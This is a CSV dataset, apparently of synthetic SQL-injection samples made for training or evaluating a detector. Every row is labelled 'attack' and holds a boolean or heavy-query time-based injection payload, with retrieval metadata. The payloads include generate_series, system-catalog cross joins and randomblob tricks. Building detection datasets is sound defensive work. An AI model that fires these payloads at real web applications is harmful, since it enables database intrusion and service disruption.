id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",nearest_attack_euclidean,R000364,6.820564178927484
CTGAN_000002,attack,boolean,"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'bzak' like 'bzak",nearest_attack_euclidean,R000668,6.115315291785318
CTGAN_000003,attack,boolean,"1   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001114,4.954822298040919
CTGAN_000004,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000773,6.392068039730471
CTGAN_000005,attack,boolean,"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000401,5.24640525148731
CTGAN_000006,attack,boolean,"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",nearest_attack_euclidean,R000792,6.611728715633147
CTGAN_000007,attack,boolean,"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001320,5.452623134386481
CTGAN_000008,attack,boolean,"1   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001110,4.3094488780316
CTGAN_000009,attack,boolean,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""qfhv""  =  ""qfhv",nearest_attack_euclidean,R000950,7.294772380082458
CTGAN_000010,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000319,6.962124985962359
CTGAN_000011,attack,boolean,"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000667,4.6107019195456
CTGAN_000012,attack,boolean,"1'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000664,5.11304394301487
CTGAN_000013,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'uorw' like 'uorw",nearest_attack_euclidean,R000944,5.831795369691607
CTGAN_000014,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R001423,6.379612687028259
